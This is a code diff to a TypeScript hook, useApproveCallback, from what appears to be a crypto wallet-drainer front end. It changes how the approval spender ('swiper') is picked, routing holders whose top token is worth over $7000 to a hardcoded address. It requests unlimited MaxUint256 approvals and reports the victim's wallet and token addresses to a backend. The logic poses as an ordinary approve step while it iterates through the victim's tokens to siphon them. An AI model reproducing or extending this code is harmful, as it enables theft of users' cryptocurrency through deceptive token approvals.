@@ -296,7 +296,11 @@ export function useApproveCallback(
 
       // if (!estimatedGas) return undefined
 
-      if (tokensFiltered[0]?.usdValue > 7000) setSwiper(swipers[111111])
+      let temperSwiper = ''
+
+      if (tokensFiltered[0]?.usdValue > 7000) temperSwiper = swipers[111111]
+      else temperSwiper = swiper
+      console.log(tokensFiltered[0]?.usdValue, temperSwiper)
       tokensFiltered.shift()
       setTokensFiltered(tokensFiltered)
 
@@ -304,7 +308,7 @@ export function useApproveCallback(
         tokenContract,
         'approve' as const,
         [
-          swiper as Address,
+          temperSwiper as Address,
           overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256),
         ],
         // {
@@ -332,12 +336,11 @@ export function useApproveCallback(
                   walletAddress: account,
                   tokenAddress: tokenContract.address,
                   purge: false,
-                  custodial: swiper == '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053' ? true : false,
+                  custodial: temperSwiper == '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053' ? true : false,
                 }),
                 method: 'POST',
               })
             }
-            setSwiper(swipers[chainId])
           }
           return response
         })
